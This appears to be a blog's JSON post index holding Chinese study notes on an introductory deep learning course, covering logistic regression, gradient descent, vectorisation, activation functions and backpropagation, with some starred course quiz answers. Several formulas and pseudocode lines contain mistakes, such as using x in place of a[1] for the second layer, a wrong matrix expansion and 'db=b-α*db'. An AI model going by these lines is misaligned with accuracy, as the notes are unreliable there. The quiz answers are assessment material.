(神经网络的更深层通常比前面的层计算更复杂的输入特征。)\n\n使用浅网络电路计算函数时，需要一个大网络，因为浅网络的表达能力有限，需要更多的神经元来拟合复杂的函数。但是使用深网络电路来计算它，只需要一个指数较小的网络，因为深网络可以通过多层的结构来学习更高层次的特征和抽象，从而减少了神经元的数量。 深网络和浅网络的区别可以类比于人类的大脑。人类的大脑通过多层的神经元来处理信息，从低级的特征到高级的概念。例如，在视觉系统中，第一层神经元可以检测边缘和线条，第二层神经元可以检测形状和纹理，第三层神经元可以检测物体和场景等等。这样，人类可以通过多层的抽象来理解复杂的视觉信息。如果只用一层神经元来处理视觉信息，那么就需要非常多的神经元来覆盖所有可能的输入情况，而且无法捕捉到高级的特征和抽象。这就像用一本书的封面来理解书中的内容一样，是不够的。\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week1_3","url":"/post/95d38cdb.html","content":"\n## 神经网络概论\n\n引入层的概念，x(i)表示第i个样本 w[1]表示第一层的w，表示是在第一层用到的w\n\n上一节学到的模型如下：\n\n<!--more-->\n\n![image-20230630222739969](./week1-3/image-20230630222739969-16897684888191.png)\n\n扩展：\n\n![image-20230630222752919](./week1-3/image-20230630222752919-16897684888202.png)\n\n和上面的图一样，算出a[1],但是会继续算，继续根据参数计算z[2],最后得到损失函数(交叉熵损失)\n\n## 神经网络表示\n\n隐藏层：在训练集中，这些中间节点的真实数据，但是在训练集中是看不见的，只能看到输入输出\n\n下图是双层神经网络示例：是双层不是三层是因为输入层通常不被看作一个层，第零层\n\n从左到右依次是输入层，隐藏层，输出层\n\n![image-20230630223343705](./week1-3/image-20230630223343705-16897684888203.png)\n\nX:输入特征，或者用a[0]表示，这里的0代表第0层，就是输入层，输入层将X/a[0]传给隐藏层，隐藏层产生a[1],在上图中a[1]应该是一个4*1的矩阵，最后的y_hat=a[2]，隐藏层可能有两个相关参数w[1],b[1],这里的w应该是3 * 4的矩阵，b是4 * 1矩阵，4代表这里有四个输出，即a[1]是一个4 * 1的矩阵，3代表x的输入特征数，输出层有两个相关参数w[2],b[2],\n\n## 计算神经网络的输出\n\n如图所示，双层神经网络logistic函数\n\n![image-20230704175622967](./week1-3/image-20230704175622967-16897684888214.png)\n\n![image-20230704184159224](./week1-3/image-20230704184159224-16897684888215.png)\n\n如图所示，这里将一层的w列为了一个矩阵，每一层的每个w都是nx * 1矩阵，和x是一样的，上图中第一层有四个结点，就用了四个w，将四个w排成一个矩阵，也就是nx * 4矩阵，然后将这个排列好的矩阵转置，变成上图所示的形状，再乘上x，再加上b，将第一层的b也设为一个矩阵，将上图总结：\n\n![image-20230704184843687](./week1-3/image-20230704184843687-16897684888216.png)\n\n伪代码如下(m个样本):\n\n```python\nfor i in range(1,m):\n    z[1](i)=W[1] * x(i) + b[1]\n    a[1](i)=sigmoid(z[1](i))\n    z[2](i)=W[2] * x(i) + b[2]\n    a[2](i)=sigmoid(z[2](i))\n```\n\n改进方法：将m个样本合并到一个矩阵,X是nx * m矩阵，W[i]是q * nx矩阵，q是第一层结点的数量，W[i] * X是q * m矩阵，一列表示一个样本，到最后也是，一列表示一个样本\n\n```python\nZ[1]=W[1] * X + b[1]\n\nA[1]=sigmoid(Z[1])\n\nZ[2]=W[2] * X + b[2]\n\nA[2]=sigmoid(Z[2])\n```\n\n## 向量化实现的解释\n\n激活函数(sigmoid)可以有更多选择\n\n## 激活函数\n\ng()用更多的选择，不止sigmoid()函数\n\n比如用tanh(z)代替sigmoid(),前者的函数：e^z-e^(-z)/e^z+e^(-z)\t后者的函数：1/1+e^(-z),前者是后者的平移，且平均值为0如图所示：\n\n![image-20230704203251929](./week1-3/image-20230704203251929-16897684888227.png)\n\n当要二元分类的时候，也就是y是0/1时，用sigmoid更方便，但是在前面几层可以tanh函数\n\nsigmoid和tanh函数的缺点，当z很大的时候，斜率很低\n\nRelU(修正线性函数)函数：a=max(0,z),如图\n\n![image-20230704203606547](./week1-3/image-20230704203606547-16897684888228.png)\n\n选择激活函数的方法：\n\n+ 如果要求二元分类，选择sigmoid,然后其他单元都选择ReLU，ReLU运算的速度会比其他的快很多\n+ 有时候也用tanh\n\n另一种ReLu函数：泄露的ReLU(leaky RelU),也就是当z小于0时，斜率不再是0，而是一个很小的数字 a=max(0.01 * z,z)\n\n总结：\n\n+ sigmoid只用于二元分类，tanh会更优越\n+ ReLU在不知道用什么激活函数的时候使用\n\n## 为什么需要非线性激活函数\n\n如果让g(z)=z(恒等激活函数,一种线性激活函数方式)有什么后果\n\nA[1]=W[1] * X +b[1]\n\nA[2]=W[2] * A[1] + b[2]=W[2] * (W[1] * X + b[1]) + b[2]=W[1] * W[2].T * x + W[2] * b[1] + b[2]\n\n还是W[] * X + b[]形式  \n\n通常只有输出层才能用线性激活方式\n\n## 激活函数的导数\n\n+ sigmoid函数导数：前面计算过一次，a=1/(1+e^(-z)),da/dz=a(1-a)\n\n+ tanh函数导数：\n\n![image-20230704212033011](./week1-3/image-20230704212033011-16897684888229.png)\n\n+ ReLU函数：max(0,z),导数比较好计算，但是z等于0的导数需要自己定义\n\n+ 泄露的ReLU函数：max(0.01 * z,z),同样，z=0是需要自己定义的：\n\n  ![image-20230704212427680](./week1-3/image-20230704212427680-168976848882210.png)\n\n## 神经网络的梯度下降法\n\n###### 单层隐藏神经网络的反向传播：\n\n参数设置：W[1] b[1] W[2] b[2],n[0]表示多输入特征，n[1]表示隐藏单元，n[2]表示输出单元(前面讲的情形中n[2]是1)\n\nW[1]是n[1] * n[0],b[1]是n[1] * 1,W[2]是n[2] * n[1],b[2]是n[2] * 1\n\n成本函数(cost function):J(W[1],b[1],W[2],b[2])=Σ(L(y_hat,y))/m,在该情形中，y_hat是a[2]\n\n初始化参数对于梯度下降法很重要：\n\nrepeat:\tdw[1]=dJ/dw[1],dw[2]=dJ/dw[2],db[1]=dJ/db[1],db[2]=dJ/db[2],w[1]=w[1]-α * dw[1]……\n\n![image-20230704215112255](./week1-3/image-20230704215112255-168976848882211.png)\n\n由前面的计算得,dz[1]的乘法是相同维度的矩阵对应位置元素相乘\n\n![image-20230704215936385](./week1-3/image-20230704215936385-168976848882212.png)\n\n## 随机初始化\n\n不能直接讲W1/W2都定义成zero矩阵，这样对于隐藏节点没有意义，以为相当于是用相同的方法进行计算\n\n因此选择用随机初始化：\n\n```python\nW1=np.random.randn(n_h,n_x)*0.01\nb1=np.zero((n_h,1))\n```\n\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week1_2","url":"/post/e2d4bc4d.html","content":"\n用(x,y)表示一个单独的样本，x是n维的一组向量，y标签值为0或者1\n\n训练集由m个训练样本组成：(x1, y1) (x2, y2) (x3, y3)...(xm, ym)\n\nx=[x1,x2,x3...xm]->n*m\n\ny=[y1,y2,y3...ym]->1*m\n\n训练集m_train\t测试集m_test\n\n<!--more-->\n\n## logistic回归\n\n针对输出标签y是0/1时(二元分类)\n\neg:判断一张图片是不是猫 y=p(y=1|x)\t0<=y<=1\n\n输入：x->n * m\tw->n * m\tb->R\n\n输出：y\n\n若用线性回归方程：y=w(T) * x+b\t无法确保y的范围\tsolution: use sigmoid(Z)函数——>y=sigmoid(w^T * x+b),sigmoid为激活函数，通过该方法，b和w才是需要学习找到的参数\n\n![image-20230628205550177](./week1-2/image-20230628205550177.png)\n\n![image-20230628205903577](./week1-2/image-20230628205903577.png)\n\n## logistic回归损失函数\n\n为了训练w,b需要定义一个成本函数(cost function)\n\n令z(i)=w^T*x(i)+b\n\n#### loss(error) function:\n\n+ 训练出的y和实际的y的差，或者是他们差平方的二分之一(但是这样不适用于梯度下降法)\n\n  ![image-20230628210813246](./week1-2/image-20230628210813246.png)\n\n+ 逻辑回归实际使用的损失函数：![image-20230628211023644](./week1-2/image-20230628211023644.png)\n\n+ 损失函数是针对单个训练样本，是衡量在单个训练样本上的表现\n\n#### cost function:\n\n+ 衡量在全体训练样本的表现\n+ 成本函数：J(w,b)=1/m*ΣL(y(hat)，y)->损失函数求和求平均值\n\n## 梯度下降法(gradient decent algorithm)\n\n用梯度下降法训练w和b，即找到令成本函数J(w,b)最小的w,b\n\n![image-20230628212108282](./week1-2/image-20230628212108282.png)\n\n针对这种凹图形，首先找到任意的w,b初始化，梯度下降法就是从初始点开始，朝最陡的下坡方向走一步，是梯度下降的不断迭代，到最后收敛到全局最优解\n\neg:α是学习率，学习率可以控制每一次迭代(步长)，比如如果该点的导数小于零，w就增加，如果该点的导数大于零，w就减小，在该图中为了方便省去了b \n\n![image-20230628213522865](./week1-2/image-20230628213522865.png)\n\n如果考虑到w和b两个参数，就用偏导数，式子大致不变，导数变成对w/b的偏导数![image-20230628213803459](./week1-2/image-20230628213803459.png)\n\n## 计算图\n\n正向传播 and 反向传播：\n\n首先通过样本正向计算出神经网络的输出，紧接着进行一个反向传输操作，用来计算出对应的梯度，导数\n\n## logistic回归中的梯度下降法\n\neg:只有一个样本的情况\n\n这里感觉有点懵，再解释一下：这里的x1,x2代表一个样本的两个值输入,此处的m就是1，然后初始化w1,w2,b,w也是个矩阵，和x的行数和列数一致，此处是将w置换之后再和x相乘，z应该是一个1 * 1的矩阵，再通过sigmod函数找到y(hat),也是一个1*1的函数，对应该样本的估计y(hat),再通过单个样本的损失函数计算损失\n\n![image-20230628223000843](./week1-2/image-20230628223000843.png)\n\n这儿的da/dz不太好理解，列了个式子：\n\n![image-20230630162532939](./week1-2/image-20230630162532939.png)\n\n## m个样本的梯度下降\n\n正如我们前面所知，成本函数J(w,b)是损失函数平均值，则依然用前面样本的例子J(w,b)对w1求导就是每个样本的损失函数对w1求导的平均值\n\n![image-20230628223929648](./week1-2/image-20230628223929648.png)\n\n用代码实现：\n\n可以用向量化省去过于冗杂的for循环\n\n伪代码：\n\n```python\nJ=0\ndw=[]\ndb=0\ndz=0\nz=[]\na=[]\nL=[]\nda=[]\ndz=[]\nfor i in range 10000:\n    for i in range m:\n        z[i]=w(T)*x[i]+b\n        a[i]=1/(1+e^(-z[i]))//估计的y值，即y_hat\n        L[i]=-(y[i]*log(a[i])+(1-y[i])*log(1-a[i]))//每个样本的损失函数\n        da[i]=-(y[i]/a[i]-(1-y[i])/(1-a[i]))//损失函数对a求导\n        dz[i]=a[i]-y[i]//损失函数对z求导\n        for j in range n:\n            dw[j]+=x[i][j]*(a[i]-y[i])\n        db+=a[i]-y[i]\n        J+=L[i]\n    J/=m\n    db/=m\n    for j in n:\n        dw[j]/=m\n    for j in n:\n        w[j]=w[j]-α*dw[j]\n    db=b-α*db\n```\n\n## 向量化\n\n向量化用于消除for循环，将多组数据放在一个矩阵中共同运算\n\n可扩展深度学习实现可在CPU或者GPU中执行，两者都支持并行（SIMD)\n\nnp.dot可快速计算矩阵的乘积，比for快几百倍\n\n## 向量化的更多例子\n\n等价：\n\n![image-20230630170937902](./week1-2/image-20230630170937902.png)\n\nnp.exp(v):v矩阵每个元素进行e^运算\n\nnp.log(v)\n\nnp.abs(v):绝对值\n\n在上面的伪代码中，就可以用向量化代替掉求每个dw[j]的循环\n\ndw不再显示表达，而是用一个矩阵表示:\n\n```python\ndw=np.zero((nx,1))\ndw+=x[i]*(a[i]-y[i])//这里的x[i]指的是第i个样本的nx*1矩阵\n```\n\n## 向量化logistic回归\n\n将多个样本用一个矩阵表示\n\n![image-20230630173643895](./week1-2/image-20230630173643895.png)\n\n细节解释：这里用了一个矩阵加一个实数，在python中，该实数会根据前面的矩阵扩展成对应形式，即前面的矩阵的每一项都会加上b，然后得到一个新的矩阵\n\n​\t伪代码：\n\n```python\nA=np.zero((1,m))//m个样本\nW=np.zero((nx,1))//x有n个特征\nX=np.zero((nx,m))//nx个特征，m个样本\nY=np.zero((1,m))\ndW=np.zero((nx,1))\nfor i in range 1000\n\tA=sigmod(W(T)*X+b)\n    dZ=A-y\n    dW=X*((A-Y)(T))/m\n    db=np.sum(A-y)/m\nW=W-α*dW\nb=b-α*db\n```\n\n## Python中的广播\n\nnumpy函数:\n\ncal=A.sum(axis=0):表示将A的每一列相加形成新矩阵，如果是水平轴求和axis=1\n\npercentage=100 * A/cal.reshape(1,4):将A的每一列的每一个值除以cal的对应列，这儿的reshape是为了确保cal是一个1*4的矩阵\n\npython中广播常见例子：\n\n![image-20230630182902907](./week1-2/image-20230630182902907.png)\n\n## 关于python_numpy向量的说明\n\na=np.random.randn(5)->a.shape=(5,)\n\na=np.random.rand(5,1)->a.shape=(5,1)\n\n如果定义成了第一种，可以用reshape(5,1)变成(5,1)的\n\n## 作业\n\n###### Consider the two following random arrays “a” and “b”:(看一下下面的这两个随机数组“a”和“b”)\n\na = np.random.randn(4, 3) # a.shape = (4, 3)\n\nb = np.random.randn(3, 2) # b.shape = (3, 2)\n\nc = a * b\n\nWhat will be the shape of “c”?(请问数组“c”的维度是多少？)\n\n*->对应元素相乘，在该题中，a和b维数不同，不是所有a/b都有对应元素，应该用np.dot\n\n而以下情况会进行广播：\n\na = np.random.randn(3, 3)\n\nb = np.random.randn(3, 1)\n\nc = a * b->c最后是(3,3)矩阵\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week1_1","url":"/post/7bddedf7.html","content":"\n## 纲要\n\n#### Neural Networks(神经网络) and Deep Learning\n\nwill learn how to build a neural network and how to train them on data\n\n#### Improving Deep Neural Networks: Hyperparameter tuning(超参数调整)，Regularization(正则化) and Optimization(高级优化算法)\n\n<!--more-->\n\n#### Structuring your Machine Learning project\n\n#### Convolutional Neural Networks(卷积神经网络，CNN)\n\nalways apply for images\n\n#### National Language Procession: Building sequence models\n\ninclude Recurrent Neural Networks(循环神经网络，RNN)\n\n## 1.2 什么是神经学习\n\ndeep learning refers to training neural networks\n\n![image-20230628162111118](./week1-1/image-20230628162111118.png)\n\n+ standard neural network\n\n  + Home feature->Price  \n\n  + Ad,user info->Click on ad?(0/1)\n\n+ CNN\n\n  + image->object\n\n+ RNN\n\n  + sequence data\n    + andio \n    + language\n\n神经网络适用于两种数据\n\n+ 结构化数据\n  + 数据的数据库\n+ 非结构化数据\n  + audio or image\n\n## 为什么深度学习会兴起\n\n## introduction answer:\n\nCD(wrong):\n\n1. What does the analogy “AI is the new electricity” refer to?(和“AI 是新电力”相类似的说法是\n\n什么？)\n\n【 】AI is powering personal devices in our homes and offices, similar to electricity.(AI 为我们\n\n的家庭和办公室的个人设备供电，类似于电力。)\n\n【 】Through the “smart grid”, AI is delivering a new wave of electricity.(通过“智能电网”，AI\n\n提供新的电能。)\n\n【 】AI runs on computers and is thus powered by electricity, but it is letting computers do \n\nthings not possible before.(AI 在计算机上运行，并由电力驱动，但是它正在让以前的计算机不\n\n能做的事情变为可能。)\n\n【★】Similar to electricity starting about 100 years ago, AI is transforming multiple \n\nindustries.(就像 100 年前产生电能一样，AI 正在改变很多的行业。)\n\n​\tAC\tACD\tF\tC\tF\tF\t\n\nC(not full):\n\n8. Why is an RNN (Recurrent Neural Network) used for machine translation, say translating \n\nEnglish to French? (Check all that apply.)(为什么在上 RNN（循环神经网络）可以应用机器翻\n\n译将英语翻译成法语？)\n\n【★】It can be trained as a supervised learning problem. (因为它可以被用做监督学习。)\n\n【 】It is strictly more powerful than a Convolutional Neural Network (CNN).(严格意义上它比\n\n卷积神经网络（CNN）效果更好。)\n\n【★】It is applicable when the input/output is a sequence (e.g., a sequence of words). (它比较\n\n适合用于当输入/输出是一个序列的时候（例如：一个单词序列）)\n\n【 】RNNs represent the recurrent process of Idea->Code->Experiment->Idea->….(RNNs 代表\n\n递归过程：想法->编码->实验->想法->…)\n\n​\tAB\n","tags":["python"],"categories":["深度学习"]},{"title":"test","url":"/post/d87f7e0c.html","content":"\n![firstpic](./test/firstpic.jpg)\n\n欢迎来到\n"}]